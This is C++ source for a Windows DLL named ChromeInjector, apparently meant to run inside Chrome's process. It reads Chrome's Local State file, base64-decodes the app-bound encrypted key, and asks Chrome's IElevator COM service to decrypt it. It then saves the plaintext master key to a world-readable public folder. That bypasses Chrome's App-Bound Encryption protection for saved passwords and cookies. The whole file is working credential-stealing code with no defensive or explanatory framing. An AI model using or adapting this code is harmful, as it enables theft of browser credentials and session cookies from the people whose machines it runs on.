// ChromeInjector.cpp
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <vector>
#include <string>
#include <nlohmann/json.hpp>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

using json = nlohmann::json;

static const char* KEY_PATH = "C:\\Users\\Public\\chrome_abe_key.bin";
static const CLSID CLSID_ChromeElevator = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
static const IID IID_IElevator = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};
static const IID IID_IElevator2 = {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};

struct IElevator : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(int, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

static std::vector<BYTE> Base64Decode(const std::string& encoded) {
    static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<BYTE> out; int val = 0, valb = -8;
    for (unsigned char c : encoded) {
        if (c == '=') break;
        auto pos = chars.find((char)c);
        if (pos == std::string::npos) continue;
        val = (val << 6) + (int)pos; valb += 6;
        if (valb >= 0) { out.push_back((BYTE)((val >> valb) & 0xFF)); valb -= 8; }
    }
    return out;
}

DWORD WINAPI WorkerThread(LPVOID) {
    if (GetFileAttributesA(KEY_PATH) != INVALID_FILE_ATTRIBUTES) return 0;
    HANDLE hMutex = CreateMutexW(nullptr, FALSE, L"Local\\ChromeAbeKeyMutex");
    if (hMutex) WaitForSingleObject(hMutex, 5000);

    if (GetFileAttributesA(KEY_PATH) == INVALID_FILE_ATTRIBUTES) {
        CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
        PWSTR localAppData = nullptr;
        SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);
        if (localAppData) {
            std::wstring statePath = std::wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Local State";
            CoTaskMemFree(localAppData);
            std::ifstream f(statePath);
            if (f) {
                json state; try { f >> state; } catch (...) {}
                if (state.contains("os_crypt") && state["os_crypt"].contains("app_bound_encrypted_key")) {
                    std::string b64 = state["os_crypt"]["app_bound_encrypted_key"];
                    auto blob = Base64Decode(b64);
                    if (blob.size() > 4) blob.erase(blob.begin(), blob.begin() + 4);
                    BSTR cipher = SysAllocStringByteLen((const char*)blob.data(), (UINT)blob.size());
                    if (cipher) {
                        IElevator* elevator = nullptr;
                        HRESULT hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator2, (void**)&elevator);
                        if (FAILED(hr)) hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&elevator);
                        if (SUCCEEDED(hr) && elevator) {
                            CoSetProxyBlanket(elevator, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                            BSTR plain = nullptr; DWORD lastError = 0;
                            hr = elevator->DecryptData(cipher, &plain, &lastError);
                            if (SUCCEEDED(hr) && plain) {
                                std::ofstream out(KEY_PATH, std::ios::binary);
                                out.write((const char*)plain, SysStringByteLen(plain));
                            }
                            if (plain) SysFreeString(plain);
                            elevator->Release();
                        }
                        SysFreeString(cipher);
                    }
                }
            }
        }
        CoUninitialize();
    }
    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
    return 0;
}

extern "C" __declspec(dllexport) DWORD WINAPI TriggerDecryption(LPVOID) {
    return WorkerThread(nullptr);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
    return TRUE;
}
